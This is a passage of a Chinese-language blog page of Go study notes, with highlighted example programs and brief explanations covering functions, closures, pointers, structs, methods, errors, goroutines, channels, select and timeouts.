class="hljs-type">int</span>) &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    a, b := test()  <br>    fmt.Println(a, b)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Variadic-Functions"><a href="#Variadic-Functions" class="headerlink" title="Variadic Functions"></a>Variadic Functions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;reflect&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(nums ...<span class="hljs-type">int</span>)</span></span> &#123;  <br>    fmt.Println(nums, <span class="hljs-string">&quot; &quot;</span>)  <br>    fmt.Println(reflect.TypeOf(nums))  <br>    total := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;  <br>       total += num  <br>    &#125;  <br>    fmt.Println(total)  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  <br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <br>    nums := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;  <br>    sum(nums...)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Closures"><a href="#Closures" class="headerlink" title="Closures"></a>Closures</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> main  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func intSe<span class="hljs-string">q()</span> func() <span class="hljs-keyword">int</span> &#123;  <br>    i := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">return</span> func() <span class="hljs-keyword">int</span> &#123;  <br>       i++  <br>       <span class="hljs-keyword">return</span> i  <br>    &#125;  <br>&#125;  <br>  <br>func main() &#123;  <br>  <br>    nextInt := intSe<span class="hljs-string">q()</span>  <br>  <br>    fmt.Println(nextInt())  <br>    fmt.Println(nextInt())  <br>    fmt.Println(nextInt())  <br>  <br>    newInts := intSe<span class="hljs-string">q()</span>  <br>    fmt.Println(newInts())  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fact</span><span class="hljs-params">(n <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> &#123;  <br>       <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> n * fact(n<span class="hljs-number">-1</span>)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(fact(<span class="hljs-number">5</span>))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Pointers"><a href="#Pointers" class="headerlink" title="Pointers"></a>Pointers</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroval</span><span class="hljs-params">(ival <span class="hljs-type">int</span>)</span></span> &#123;  <br>    ival = <span class="hljs-number">0</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroptr</span><span class="hljs-params">(iptr *<span class="hljs-type">int</span>)</span></span> &#123;  <br>    *iptr = <span class="hljs-number">0</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    i := <span class="hljs-number">1</span>  <br>    fmt.Println(<span class="hljs-string">&quot;initial:&quot;</span>, i)  <br>  <br>    zeroval(i)  <br>    fmt.Println(<span class="hljs-string">&quot;zeroval:&quot;</span>, i)  <br>  <br>    zeroptr(&amp;i)  <br>    fmt.Println(<span class="hljs-string">&quot;zeroptr:&quot;</span>, i)  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;pointer:&quot;</span>, &amp;i)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Structs"><a href="#Structs" class="headerlink" title="Structs"></a>Structs</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xquery">package main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type company struct &#123;  <br>   <span class="hljs-built_in"> name</span><span class="hljs-built_in"> string</span>  <br>   <span class="hljs-built_in"> id</span>   int  <br>&#125;  <br>  <br>func newCompany<span class="hljs-built_in">(name</span><span class="hljs-built_in"> string</span>) *company &#123;  <br>    <span class="hljs-type">item</span> := company<span class="hljs-built_in">&#123;name</span>:<span class="hljs-built_in"> name</span>&#125;  <br>    <span class="hljs-keyword">return</span> &amp;<span class="hljs-type">item</span>  <br>&#125;  <br>  <br>func main() &#123;  <br>  <br>    fmt.Println(company&#123;<span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">20</span>&#125;)  <br>    fmt.Println(newCompany(<span class="hljs-string">&quot;BBB&quot;</span>))  <br>  <br>    fmt.Println(&amp;company<span class="hljs-built_in">&#123;name</span>: <span class="hljs-string">&quot;Ann&quot;</span>,<span class="hljs-built_in"> id</span>: <span class="hljs-number">40</span>&#125;)  <br>    fmt.Println(company<span class="hljs-built_in">&#123;name</span>: <span class="hljs-string">&quot;Ann&quot;</span>,<span class="hljs-built_in"> id</span>: <span class="hljs-number">40</span>&#125;)  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type rect <span class="hljs-keyword">struct</span> &#123;  <br>    width  <span class="hljs-type">int</span>  <br>    height <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-built_in">func</span> (r *rect) <span class="hljs-built_in">area</span>() <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> r.width * r.height  <br>&#125;  <br>  <br><span class="hljs-built_in">func</span> (r *rect) <span class="hljs-built_in">c</span>() <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*r.width + <span class="hljs-number">2</span>*r.height  <br>&#125;  <br>  <br>func <span class="hljs-built_in">main</span>() &#123;  <br>    re := rect&#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;  <br>    fmt.<span class="hljs-built_in">Println</span>(re.<span class="hljs-built_in">area</span>())  <br>    fmt.<span class="hljs-built_in">Println</span>(re.<span class="hljs-built_in">c</span>())  <br>&#125;<br></code></pre></td></tr></table></figure><p>golang 也支持在 struct 上定义方法。</p><h2 id="Struct-Embedding"><a href="#Struct-Embedding" class="headerlink" title="Struct Embedding"></a>Struct Embedding</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs csharp">package main  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type <span class="hljs-keyword">base</span> <span class="hljs-keyword">struct</span> &#123;  <br>    num <span class="hljs-built_in">int</span>  <br>&#125;  <br>  <br>type container <span class="hljs-keyword">struct</span> &#123;  <br>    <span class="hljs-keyword">base</span>  <br>    str <span class="hljs-built_in">string</span>  <br>&#125;  <br>  <br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;  <br>    c := container&#123;<span class="hljs-keyword">base</span>&#123;  <br>       num: <span class="hljs-number">1</span>,  <br>    &#125;, <span class="hljs-string">&quot;test&quot;</span>&#125;  <br>    fmt.Println(c.<span class="hljs-keyword">base</span>, c.str, c.num, c.<span class="hljs-keyword">base</span>.num)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;errors&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;  <br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">42</span> &#123;  <br>  <br>       <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>, errors.New(<span class="hljs-string">&quot;can&#x27;t work with 42&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> arg + <span class="hljs-number">3</span>, <span class="hljs-literal">nil</span>  <br>  <br>&#125;  <br>  <br><span class="hljs-keyword">var</span> ErrOutOfTea = fmt.Errorf(<span class="hljs-string">&quot;no more tea available&quot;</span>)  <br><span class="hljs-keyword">var</span> ErrPower = fmt.Errorf(<span class="hljs-string">&quot;can&#x27;t boil water&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeTea</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">error</span> &#123;  <br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">2</span> &#123;  <br>       <span class="hljs-keyword">return</span> ErrOutOfTea  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> arg == <span class="hljs-number">4</span> &#123;  <br>       <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;making tea: %w&quot;</span>, ErrPower)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    err := makeTea(<span class="hljs-number">2</span>)  <br>    fmt.Println(err)  <br>    _, err = f(<span class="hljs-number">42</span>)  <br>    fmt.Println(err)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Goroutines"><a href="#Goroutines" class="headerlink" title="Goroutines"></a>Goroutines</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">a</span><span class="hljs-params">(from <span class="hljs-type">string</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;  <br>       fmt.Println(from, <span class="hljs-string">&quot; : &quot;</span>, i)  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    a(<span class="hljs-string">&quot;direct&quot;</span>)  <br>    <span class="hljs-keyword">go</span> a(<span class="hljs-string">&quot;goroutine&quot;</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> &#123;  <br>       fmt.Println(msg)  <br>    &#125;(<span class="hljs-string">&quot;going&quot;</span>)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;done&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       messages &lt;- <span class="hljs-string">&quot;ping&quot;</span>  <br>    &#125;()  <br>    msg := &lt;-messages  <br>    fmt.Println(msg)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Channel-Buffering"><a href="#Channel-Buffering" class="headerlink" title="Channel Buffering"></a>Channel Buffering</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">2</span>)  <br>    messages &lt;- <span class="hljs-string">&quot;buffered&quot;</span>  <br>    messages &lt;- <span class="hljs-string">&quot;channel&quot;</span>  <br>  <br>    fmt.Println(&lt;-messages)  <br>    fmt.Println(&lt;-messages)  <br>&#125;<br></code></pre></td></tr></table></figure><p>channel 默认是无缓冲的，因此需要有另一个 channel 接收。但是如果设置了有缓存的，则不需要。</p><h2 id="Channel-Synchronization"><a href="#Channel-Synchronization" class="headerlink" title="Channel Synchronization"></a>Channel Synchronization</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(done <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;working&quot;</span>)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;done&quot;</span>)  <br>    done &lt;- <span class="hljs-literal">true</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> worker(done)  <br>  <br>    &lt;-done  <br>&#125;<br></code></pre></td></tr></table></figure><p>代码中的 &lt;-done 表示主程序从通道 done中接收数据。在该程序中，当 worker goroutine 完成其工作后，它会将一个布尔值发送到 done 通道，而主程序则等待从 done 通道接收数据。<br>如果删除了&lt;-done，主程序就不会等待worker goroutine完成其工作。虽然worker goroutine可能会成功地将一个布尔值发送到通道中（因为通道是有缓冲的，所以发送不会被阻塞），但是主程序不会等待这个值的接收，而是直接退出了。<br>这样一来，即使 worker goroutine 已经完成了它的工作，主程序也提前退出了，整个程序也就结束了。</p><h2 id="Channel-Directions"><a href="#Channel-Directions" class="headerlink" title="Channel Directions"></a>Channel Directions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ping</span><span class="hljs-params">(pings <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>, msg <span class="hljs-type">string</span>)</span></span> &#123;  <br>    pings &lt;- msg  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pong</span><span class="hljs-params">(pings &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, pongs <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> &#123;  <br>    msg := &lt;-pings  <br>    pongs &lt;- msg  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    pings := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    pongs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    ping(pings, <span class="hljs-string">&quot;passed message&quot;</span>)  <br>    pong(pings, pongs)  <br>    fmt.Println(&lt;-pongs)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h2><p>在 Go 语言中，select 语句用于处理多个通道操作。它类似于 switch 语句，但用于通道操作。select 语句使得一个 Go 程序可以等待多个通道操作同时响应。</p><ul><li>多通道操作：select 语句允许在多个通道上等待操作，一次只处理一个准备好的通道操作。</li><li>随机选择：如果多个 case 同时准备好，select 会随机选择其中一个来执行。</li><li>无阻塞等待：如果没有任何通道准备好，select 会立即执行 default 语句（如果存在）。这种特性使得 select 语句可以用于非阻塞的通道操作。</li><li>阻塞等待：如果没有 default 语句，并且所有 case 都没有准备好，select 语句会阻塞，直到其中一个 case 准备好。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    c2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second)  <br>       c1 &lt;- <span class="hljs-string">&quot;one&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c2 &lt;- <span class="hljs-string">&quot;two&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++ &#123;  <br>       <span class="hljs-keyword">select</span> &#123;  <br>       <span class="hljs-keyword">case</span> msg1 := &lt;-c1:  <br>          fmt.Println(<span class="hljs-string">&quot;received&quot;</span>, msg1)  <br>       <span class="hljs-keyword">case</span> msg2 := &lt;-c2:  <br>          fmt.Println(<span class="hljs-string">&quot;received&quot;</span>, msg2)  <br>       &#125;  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c1 &lt;- <span class="hljs-string">&quot;result 1&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> res := &lt;-c1:  <br>       fmt.Println(res)  <br>    <span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">1</span> * time.Second):  <br>       fmt.Println(<span class="hljs-string">&quot;timeout 1&quot;</span>)  <br>    &#125;  <br>  <br>    c2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c2 &lt;- <span class="hljs-string">&quot;result 2&quot;</span>  <br>    &#125;()  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> res := &lt;-c2:  <br>       fmt.Println(res)  <br>    <span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">3</span> * time.Second):  <br>       fmt.Println(<span class="hljs-string">&quot;timeout 2&quot;</span>)  <br>    